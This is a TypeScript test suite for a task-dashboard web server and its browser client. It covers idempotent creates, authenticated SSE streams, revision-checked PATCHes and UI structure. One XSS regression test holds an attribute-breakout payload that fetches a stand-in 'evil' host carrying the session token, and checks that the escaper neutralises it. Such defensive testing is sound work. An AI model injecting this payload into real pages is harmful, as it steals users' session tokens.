// Mazzy Command Center
// Copyright (c) 2026 Mazurov N.N. (https://github.com/mazurovn)
// Proprietary source-available license — no modification or redistribution
// without prior written permission. See LICENSE.

import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, readFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { testScratchRoot } from "./git-root.ts";
import test from "node:test";
import { MazzyHttpServer } from "../src/server.ts";
import { MazzyStore } from "../src/store.ts";

const root=testScratchRoot;
async function fixture(){mkdirSync(root,{recursive:true});const dir=mkdtempSync(join(root,"realtime-")),store=new MazzyStore(join(dir,"state.db")),server=new MazzyHttpServer(store,0);await server.start();return {store,server,token:new URL(server.accessUrl).hash.slice(7),close:async()=>{await server.stop();store.close();rmSync(dir,{recursive:true,force:true})}}}
const request=(url:string,token:string,init:RequestInit={})=>fetch(url,{...init,headers:{"x-pi-ops-token":token,...init.headers}});
async function nextFrame(reader:ReadableStreamDefaultReader<Uint8Array>,state:{text:string;sawHeartbeat:boolean}){const decoder=new TextDecoder();while(true){while(!state.text.includes("\n\n")){const part=await reader.read();assert.equal(part.done,false);state.text+=decoder.decode(part.value)}const cut=state.text.indexOf("\n\n"),frame=state.text.slice(0,cut);state.text=state.text.slice(cut+2);if(frame.startsWith(":")){assert.doesNotMatch(frame,/data:|event:/,"heartbeat is never an Ops event");state.sawHeartbeat=true;continue}const data=frame.split("\n").find(x=>x.startsWith("data: ")),id=frame.split("\n").find(x=>x.startsWith("id: ")),name=frame.split("\n").find(x=>x.startsWith("event: "));assert.ok(data,"must be a data event rather than a heartbeat");assert.ok(id,"durable event has an SSE cursor");return {id:Number(id.slice(4)),name:name?.slice(7),event:JSON.parse(data.slice(6)) as {id:number;taskId:string;type:string;cursor?:number;requiresFullSnapshot?:boolean}}}}
async function waitFor(assertion:()=>void):Promise<void>{let failure:unknown;for(let i=0;i<30;i++){try{assertion();return}catch(error){failure=error;await new Promise(resolve=>setTimeout(resolve,10))}}throw failure}

test("durable web create replays a lost response and rejects changed payload",async()=>{const f=await fixture();try{const u=f.server.url+"/api/tasks",headers={"content-type":"application/json","Idempotency-Key":"lost-response"};const one=await request(u,f.token,{method:"POST",headers,body:JSON.stringify({title:"once",description:"same",priority:10,risk:"high"})});assert.equal(one.status,201);const task=await one.json() as {id:string};const replay=await request(u,f.token,{method:"POST",headers,body:JSON.stringify({title:"once",description:"same",priority:10,risk:"high"})});assert.equal(replay.status,201);assert.equal((await replay.json() as {id:string}).id,task.id);const conflict=await request(u,f.token,{method:"POST",headers,body:JSON.stringify({title:"different"})});assert.equal(conflict.status,409);assert.equal(f.store.listTasks().length,1)}finally{await f.close()}});

test("authenticated stream replays ordered durable events, observes parent mutations, and cleans up",async()=>{const f=await fixture();try{const first=f.store.createTask({title:"replay"});const ready=f.store.updateTask(first.id,{state:"READY",expectedRevision:first.revision,actor:"parent-tool"});assert.equal((await fetch(f.server.url+"/api/stream")).status,403);assert.equal((await fetch(f.server.url+"/api/task-details",{method:"POST",body:"{}"})).status,403);const stream=await request(f.server.url+"/api/stream",f.token,{headers:{"Last-Event-ID":"0"}});assert.equal(stream.status,200);assert.equal(stream.headers.get("cache-control"),"no-cache");assert.match(stream.headers.get("content-security-policy")??"",/default-src 'none'/);const reader=stream.body!.getReader(),state={text:"",sawHeartbeat:false};const replayOne=await nextFrame(reader,state),replayTwo=await nextFrame(reader,state);assert.equal(state.sawHeartbeat,true,"stream heartbeat remains a comment frame");assert.deepEqual([replayOne.event.type,replayTwo.event.type],["task.created","task.updated"]);assert.deepEqual([replayOne.id,replayTwo.id],[1,2]);const changed=f.store.updateTask(ready.id,{state:"BACKLOG",expectedRevision:ready.revision,actor:"parent-tool"});const live=await nextFrame(reader,state);assert.equal(live.event.type,"task.updated");assert.equal(live.event.taskId,changed.id);assert.equal(live.id,3);await reader.cancel();await waitFor(()=>assert.equal(f.server.activeEventStreams,0));const details=await request(f.server.url+"/api/task-details",f.token,{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({taskIds:[first.id]})});assert.equal(details.status,200);assert.equal((await details.json() as {details:Array<{task:{id:string}}>} ).details[0]?.task.id,first.id)}finally{await f.close()}});

test("two authenticated SSE clients independently receive real HTTP POST and PATCH mutations",async()=>{const f=await fixture();try{assert.equal((await fetch(f.server.url+"/api/stream")).status,403,"stream auth is mandatory");assert.equal((await request(f.server.url+"/api/tasks",f.token,{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({title:"missing idempotency"})})).status,400,"web create idempotency header is mandatory");const a=await request(f.server.url+"/api/stream",f.token),b=await request(f.server.url+"/api/stream",f.token),ar=a.body!.getReader(),br=b.body!.getReader(),as={text:"",sawHeartbeat:false},bs={text:"",sawHeartbeat:false};const created=await request(f.server.url+"/api/tasks",f.token,{method:"POST",headers:{"content-type":"application/json","Idempotency-Key":"live-create"},body:JSON.stringify({title:"live"})});assert.equal(created.status,201);const task=await created.json() as {id:string;revision:number};for(const frame of [await nextFrame(ar,as),await nextFrame(br,bs)])assert.equal(frame.event.type,"task.created");const patched=await request(f.server.url+"/api/tasks/"+task.id,f.token,{method:"PATCH",headers:{"content-type":"application/json"},body:JSON.stringify({title:"live updated",expectedRevision:task.revision})});assert.equal(patched.status,200);for(const frame of [await nextFrame(ar,as),await nextFrame(br,bs)]){assert.equal(frame.event.type,"task.updated");assert.equal(frame.event.taskId,task.id)}await ar.cancel();await br.cancel();await waitFor(()=>assert.equal(f.server.activeEventStreams,0))}finally{await f.close()}});

test("stale SSE cursor receives an explicit reset rather than a silently truncated replay",async()=>{const f=await fixture();try{for(let i=0;i<201;i++)f.store.createTask({title:"gap "+i});const stream=await request(f.server.url+"/api/stream",f.token,{headers:{"Last-Event-ID":"0"}}),reader=stream.body!.getReader(),state={text:"",sawHeartbeat:false},reset=await nextFrame(reader,state);assert.equal(reset.name,"mazzy-reset");assert.deepEqual(reset.event,{type:"mazzy.reset",cursor:201,requiresFullSnapshot:true});assert.equal(reset.id,201);await reader.cancel()}finally{await f.close()}});

test("web PATCH only accepts current server uiTransitions and requires expectedRevision",async()=>{const f=await fixture();try{const task=f.store.createTask({title:"drop"}),u=f.server.url+"/api/tasks/"+task.id;const noRevision=await request(u,f.token,{method:"PATCH",headers:{"content-type":"application/json"},body:JSON.stringify({state:"READY"})});assert.equal(noRevision.status,400);for(const state of ["RUNNING","DONE"]){const refused=await request(u,f.token,{method:"PATCH",headers:{"content-type":"application/json"},body:JSON.stringify({state,expectedRevision:task.revision})});assert.equal(refused.status,400);assert.match((await refused.json() as {error:string}).error,/uiTransitions/)}const valid=await request(u,f.token,{method:"PATCH",headers:{"content-type":"application/json"},body:JSON.stringify({state:"READY",expectedRevision:task.revision})});assert.equal(valid.status,200);const stale=await request(u,f.token,{method:"PATCH",headers:{"content-type":"application/json"},body:JSON.stringify({priority:10,expectedRevision:task.revision})});assert.equal(stale.status,409)}finally{await f.close()}});

test("browser client contract exercises authenticated API construction without token URLs",async()=>{const html=readFileSync(new URL("../static/index.html",import.meta.url),"utf8");assert.match(html,/Access URL required/);assert.match(html,/fetch\('\/api\/stream'/);assert.match(html,/getReader\(\)/);assert.match(html,/Idempotency-Key/);assert.match(html,/\/api\/task-details/);assert.match(html,/uiTransitions/);assert.match(html,/function createTask\(/);assert.match(html,/function saveTaskEdit\(/);assert.match(html,/function transition\(/);assert.doesNotMatch(html,/token=.*\/api|\/api[^'"`]*\?[^'"`]*token/i);const apiStart=html.indexOf("function api(path,opt={})"),apiEnd=html.indexOf("function mutationEnabled",apiStart);assert.ok(apiStart>=0&&apiEnd>apiStart,"the real browser api helper is present");const apiCode=html.slice(apiStart,apiEnd),calls:Array<{path:string;init:RequestInit}>=[];const api=new Function("TOKEN","fetch","E","ACTIVE_SCOPE",`${apiCode};return api`)("capability",async(path:string,init:RequestInit)=>{calls.push({path,init});return new Response(JSON.stringify({ok:true}),{headers:{"content-type":"application/json"}})},{hidden:false},"");await api("/api/tasks",{method:"POST",headers:{"Idempotency-Key":"operation"},body:"{}"});await api("/api/tasks/example",{method:"PATCH",body:"{}"});assert.deepEqual(calls.map(call=>call.path),["/api/tasks","/api/tasks/example"]);assert.ok(calls.every(call=>!call.path.includes("?")&&!call.path.includes("capability")));assert.ok(calls.every(call=>new Headers(call.init.headers).get("x-mazzy-token")==="capability"));assert.equal(new Headers(calls[0]!.init.headers).get("Idempotency-Key"),"operation")});

test("real create helper mints fresh submits and only retry-original reuses its saved payload", async () => {
  const html = readFileSync(new URL("../static/index.html", import.meta.url), "utf8");
  const start = html.indexOf("function createPayload(form)");
  const end = html.indexOf("async function consumeStream", start);
  assert.ok(start >= 0 && end > start, "real create helper is present");
  const saved = new Map<string, string>();
  const calls: Array<{ key: string; payload: unknown }> = [];
  const root = { innerHTML: "", hidden: true, append() {} };
  let serial = 0, fail = false;
  const form = { elements: { title: { value: "one" }, description: { value: "first" }, priority: { value: "10" }, risk: { value: "high" } }, querySelector: () => ({ disabled: false }), reset() {} };
  type MockForm = typeof form;
  const helpers = new Function("mutationEnabled", "crypto", "sessionStorage", "DETAILS", "accepted", "error", "renderBoard", "api", "refresh", "document", `${html.slice(start, end)};return {createTask,retryOriginalCreate}`)(
    () => true, { randomUUID: () => "key-" + (++serial) },
    { getItem: (key: string) => saved.get(key) ?? null, setItem: (key: string, value: string) => void saved.set(key, value), removeItem: (key: string) => void saved.delete(key) },
    {}, () => {}, () => {}, () => {}, async (_path: string, init: RequestInit) => { calls.push({ key: new Headers(init.headers).get("Idempotency-Key")!, payload: JSON.parse(String(init.body)) }); if (fail) throw new Error("network lost"); return { id: "server" }; }, async () => {},
    { querySelector: () => root, createElement: () => ({ addEventListener() {} }) },
  ) as { createTask: (form: MockForm) => Promise<void>; retryOriginalCreate: (form: MockForm) => Promise<void> };
  await helpers.createTask(form);
  form.elements.title.value = "two";
  await helpers.createTask(form);
  assert.deepEqual(calls.slice(0, 2), [{ key: "key-1", payload: { title: "one", description: "first", type: "task", priority: 10, risk: "high" } }, { key: "key-2", payload: { title: "two", description: "first", type: "task", priority: 10, risk: "high" } }]);
  fail = true; form.elements.title.value = "original";
  await helpers.createTask(form);
  fail = false; form.elements.title.value = "edited after failure";
  await helpers.createTask(form);
  assert.deepEqual(calls[3], { key: "key-4", payload: { title: "edited after failure", description: "first", type: "task", priority: 10, risk: "high" } }, "ordinary submit never replays stale recovery");
  fail = true; form.elements.title.value = "retry source";
  await helpers.createTask(form);
  fail = false; form.elements.title.value = "changed before retry";
  await helpers.retryOriginalCreate(form);
  assert.deepEqual(calls[5], { key: "key-5", payload: { title: "retry source", description: "first", type: "task", priority: 10, risk: "high" } }, "Retry original replays its exact key and payload");
});

test("browser unread state persists only cursors and counts, and stream reconciliation does not count refreshes",()=>{const html=readFileSync(new URL("../static/index.html",import.meta.url),"utf8");assert.match(html,/const UI=MazzyChatState\.read\(localStorage\),DRAFTS=\{\},PENDING=\{\}.*UNREAD=UI\.unread/);const save=html.slice(html.indexOf("function save()"),html.indexOf("function esc",html.indexOf("function save()")));assert.match(save,/unread:UNREAD/);assert.doesNotMatch(save,/drafts:DRAFTS|pending:PENDING|body/);assert.match(html,/function reconcileUnread\(snapshot\).*unreadCount:0/);assert.match(html,/function markUnread\(taskId,cursor\).*cursor<=seen\.lastSeenEventId/);assert.match(html,/function openDrawer\(id,focus\).*markSeen\(id\)/);assert.match(html,/eventType==='event: mazzy-reset'.*await refresh\(\)/)});

test("valid token supports the same create payload shape used by the task form",async()=>{const f=await fixture();try{const payload={title:"form task",description:"acceptance",priority:10,risk:"high"};const response=await request(f.server.url+"/api/tasks",f.token,{method:"POST",headers:{"content-type":"application/json","Idempotency-Key":"form-operation"},body:JSON.stringify(payload)});assert.equal(response.status,201);const created=await response.json() as typeof payload&{state:string};assert.deepEqual({title:created.title,description:created.description,priority:created.priority,risk:created.risk},payload);assert.equal(created.state,"BACKLOG")}finally{await f.close()}});

test("client escapes attribute-context values so a quote in a task title cannot break out (B3 XSS)", () => {
  const html = readFileSync(new URL("../static/index.html", import.meta.url), "utf8");
  // The attribute escaper must exist and be used for title/clientMessageId/agent-name value="..." sinks.
  assert.match(html, /function escA\(x\)\{return esc\(x\)\.replace\(/);
  assert.match(html, /value="'\+escA\(draft\.title\)\+'"/);
  assert.match(html, /data-retry="'\+escA\(c\.clientMessageId\)\+'"/);
  assert.match(html, /value="'\+escA\(a\.name\)\+'"/);
  // Exercise the real escA + esc against a token-exfiltration payload.
  const escStart = html.indexOf("function esc(x)"), escEnd = html.indexOf("function announce", escStart);
  const makeDiv = () => { let t = ""; return { set textContent(v: unknown) { t = String(v); }, get innerHTML() { return t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); } }; };
  const { escA } = new Function("document", `${html.slice(escStart, escEnd)};return {escA}`)({ createElement: makeDiv }) as { escA: (x: unknown) => string };
  const payload = `x" autofocus onfocus="fetch('http://evil/?t='+sessionStorage['mazzy-control-token'])`;
  const out = escA(payload);
  assert.ok(!out.includes('"'), "no raw double-quote survives attribute escaping");
});

test("board drag/drop uses a module-scoped DRAG_ID, not protected-mode dataTransfer during dragover (B1)", () => {
  const html = readFileSync(new URL("../static/index.html", import.meta.url), "utf8");
  assert.match(html, /DRAG_ID=null/);
  assert.match(html, /dragstart',e=>\{DRAG_ID=d\.task\.id/);
  // dragover must consult DRAG_ID, not read dataTransfer.getData (which returns "" in protected mode).
  assert.match(html, /dragover',e=>\{const d=DETAILS\[DRAG_ID\]/);
});

test("control availability keys off acceptanceRevision, not the mutable lifecycle revision (B2)", () => {
  const html = readFileSync(new URL("../static/index.html", import.meta.url), "utf8");
  assert.match(html, /function activeBinding\(d\)\{return d\.bindings\.find\(b=>b\.role==='worker'&&b\.state==='active'&&b\.acceptanceRevision===d\.task\.acceptanceRevision\)/);
});

test("dashboard shell renders a top section nav and a left project rail", () => {
  const html = readFileSync(new URL("../static/index.html", import.meta.url), "utf8");
  // Structural surfaces must exist.
  assert.match(html, /<nav id="topnav"/);
  assert.match(html, /<aside id="rail"/);
  // Nav is rendered from a sections list; Backlog + SDD/ADR are enabled, the rest
  // are disabled ("coming soon") via the data-driven ENABLED map.
  assert.match(html, /const SECTIONS=\['Backlog','SDD\/ADR','Workflows'/);
  assert.match(html, /const ENABLED=\{'Backlog':1,'SDD\/ADR':1\}/);
  assert.match(html, /function renderNav\(\)/);
  // The graph tab mounts the vendored, CSP-safe renderer and its data endpoint.
  assert.match(html, /\/assets\/graph-view\.js/);
  assert.match(html, /id="graph-mount"/);
  assert.match(html, /function initGraph\(\)/);
  // Non-hardcoding: the legend/filters are built from the payload facets, not a
  // literal kind list in the section renderer.
  assert.doesNotMatch(html, /renderLegend[\s\S]{0,400}\['adr','inv','fr'\]/);
  // Rail shows the redacted project context and spec/architecture presence from /api/context.
  assert.match(html, /function renderRail\(c,scopes\)/);
  assert.match(html, /c\.specPresent\?'doclink':'docmiss'/);
  assert.match(html, /c\.architecturePresent\?'doclink':'docmiss'/);
  // loadContext drives both nav and rail.
  assert.match(html, /async function loadContext\(\)\{if\(!TOKEN\)return;renderNav\(\)/);
  // Multi-project: the client sends x-mazzy-project for the active scope and can switch projects.
  assert.match(html, /x-mazzy-project/);
  assert.match(html, /function switchScope\(scope\)/);
  assert.match(html, /\/api\/scopes/);
});